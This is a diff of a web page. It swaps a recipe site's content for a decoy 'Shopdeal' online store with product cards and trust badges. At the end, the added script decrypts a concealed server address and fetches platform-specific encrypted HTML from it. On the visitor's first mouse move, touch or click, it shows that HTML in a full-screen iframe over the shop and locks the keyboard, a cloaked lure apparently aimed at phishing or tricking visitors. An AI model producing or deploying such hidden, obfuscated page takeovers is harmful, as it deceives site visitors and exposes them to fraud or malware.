-      <li><p><strong>Wait for grey.</strong> Cook once the coals are covered in a light grey ash.</p></li>
-      <li><p><strong>Build zones.</strong> Pile coals on one side for high heat and leave the other side cooler.</p></li>
-      <li><p><strong>Clean and oil.</strong> A hot, clean, lightly oiled grate stops food sticking.</p></li>
-      <li><p><strong>Glaze late.</strong> Sweet soy or miso glazes burn quickly, so brush them on at the end.</p></li>
-    </ol>
-  </div>
-</section>
-
-<section class="sec" aria-labelledby="sk-t">
-  <div class="wrap feature">
-    <div class="pic"><img src="https://images.unsplash.com/photo-1788843304296-91818b2676b5?auto=format&fit=crop&w=900&q=75" alt="brush basting vegetable skewers over a grill" width="900" height="760" loading="lazy"></div>
-    <div>
-      <span class="kick g">Weeknight favourite</span>
-      <h2 id="sk-t">Miso-glazed vegetable skewers</h2>
-      <p>Thread chunks of courgette, shiitake, spring onion and firm tofu onto soaked bamboo skewers. Grill over medium heat for 8&ndash;10 minutes, turning often, then brush with a glaze of white miso, a little honey or maple syrup, rice vinegar and grated ginger for the final two minutes.</p>
-      <p>Serve over steamed rice with a handful of blistered edamame and a sprinkle of toasted sesame seeds.</p>
-      <a class="btn btn--eda" href="recipes.html">More grill recipes</a>
-    </div>
-  </div>
-</section>
-
-<section class="sec paper" aria-labelledby="fq-t">
-  <div class="wrap faq-grid">
-    <div><span class="kick">Questions</span><h2 id="fq-t">Cooking questions</h2><p class="muted">Not sure about an ingredient or technique? Ask us and we&#8217;ll help.</p><a class="btn btn--coal" href="contact.html">Ask the kitchen</a><div class="pic"><img src="https://images.unsplash.com/photo-1544621678-f17b5b909559?auto=format&fit=crop&w=800&q=75" alt="pair of wooden chopsticks resting on a ceramic bowl" width="800" height="640" loading="lazy"></div></div>
-    <div><details open><summary>What is edamame?</summary><p>Edamame are young, green soybeans harvested before they mature. They are usually boiled, steamed or grilled in their pods and seasoned with salt. Only the beans inside are eaten; the tough pods are discarded.</p></details><details><summary>Is edamame good on the grill?</summary><p>Yes. Grilling the pods over high heat blisters and chars them, adding a smoky flavour. A grill basket or perforated tray stops them falling through the grate.</p></details><details><summary>Do I need a charcoal grill for these recipes?</summary><p>No. A gas grill, stovetop griddle pan or oven grill works for every recipe. Charcoal simply adds extra smokiness.</p></details><details><summary>What is umami?</summary><p>Umami is the savoury taste found in foods such as miso, soy sauce, mushrooms, seaweed and ripe tomatoes. Balancing it with acidity and freshness makes dishes taste rounded.</p></details><details><summary>Are your recipes vegetarian?</summary><p>Most are plant-forward, and many are fully vegetarian or vegan. A few include fish or eggs. Each recipe is clearly labelled, and we suggest swaps where possible.</p></details><details><summary>Is Edamame Cinder a restaurant?</summary><p>No. Edamame Cinder is an independent home-cooking website. We publish recipes and guides; we do not operate a restaurant, sell food or take orders.</p></details></div>
-  </div>
-</section>
-
-<section class="sec" id="notes" aria-labelledby="nl-t">
-  <div class="wrap">
-    <div class="nl">
-      <div class="in">
-        <span class="kick" style="color:var(--ember-lt)">Twice a month</span>
-        <h2 id="nl-t">Ember Notes</h2>
-        <p>A short email with a seasonal recipe, one pantry ingredient explained and a grilling tip. No spam, unsubscribe any time.</p>
-        <div class="row"><a class="btn" href="mailto:hello@edamamecinder.com?subject=Subscribe%20to%20Ember%20Notes&body=Please%20add%20me%20to%20Ember%20Notes.">Subscribe by email</a></div>
-        <p class="small">The button opens your email app with a short subscription request. Read our <a href="privacy-policy.html">Privacy Policy</a>.</p>
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
-      <div class="pic"><img src="https://images.unsplash.com/photo-1606756790138-261d2b21cd75?auto=format&fit=crop&w=900&q=75" alt="cooked food served in black ceramic bowls" width="900" height="700" loading="lazy"></div>
     </div>
+
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</section>
-</main>
-<footer class="ftr">
-  <div class="wrap">
-    <div class="ftr-grid">
-      <div><a class="logo" href="index.html"><svg class="stamp" viewBox="0 0 40 40" aria-hidden="true"><rect x="1" y="1" width="38" height="38" rx="6" fill="#E2582B"/><ellipse cx="15" cy="20" rx="5" ry="7" fill="#7FA650" transform="rotate(-20 15 20)"/><ellipse cx="25" cy="20" rx="5" ry="7" fill="#7FA650" transform="rotate(20 25 20)"/><path d="M8 32 Q20 26 32 32" fill="none" stroke="#1C1C1A" stroke-width="2.2" stroke-linecap="round"/></svg><span><b>Edamame Cinder</b><small>GREENS &middot; GRAINS &middot; GRILL</small></span></a><p>Japanese-inspired home cooking built around vegetables, rice and the gentle smoke of a charcoal grill. Simple techniques, clear recipes and pantry know-how.</p></div>
-      <div><h4>Cook</h4><a href="recipes.html">Recipes</a><a href="pantry-guide.html">Pantry &amp; Grill Guide</a><a href="index.html#grill">Grill Heat Guide</a><a href="index.html#bowl-sec">Bowl Builder</a></div>
-      <div><h4>Policies</h4><a href="privacy-policy.html">Privacy Policy</a><a href="terms-and-conditions.html">Terms &amp; Conditions</a><a href="cookie-policy.html">Cookie Policy</a><a href="disclaimer.html">Disclaimer</a><a href="editorial-policy.html">Editorial Policy</a></div>
-      <div><h4>Contact</h4><p>181 Mercer Street, New York, NY 10012, United States</p><a href="tel:+18887775845">+1-888-777-5845</a><a href="mailto:hello@edamamecinder.com">hello@edamamecinder.com</a></div>
-    </div>
-    <div class="ftr-base"><span>&copy; <span id="year">2026</span> Edamame Cinder. All rights reserved.</span><span>Photography from Unsplash under the Unsplash License.</span></div>
-  </div>
-</footer>
-<div class="cookie" id="cookie" role="dialog" aria-label="Cookie notice"><p>We use essential storage and, with your permission, analytics cookies to see which recipes readers cook most. <a href="cookie-policy.html">Cookie Policy</a></p><button class="y" data-cookie="accepted">Accept</button><button data-cookie="declined">Essential only</button></div>
-<script src="assets/js/main.js" defer></script>
+
+
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
+
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";
+
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
+
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
+
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
+
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
+
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
+
+  
+  let lastUrl = null;
+  let readyPromise = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
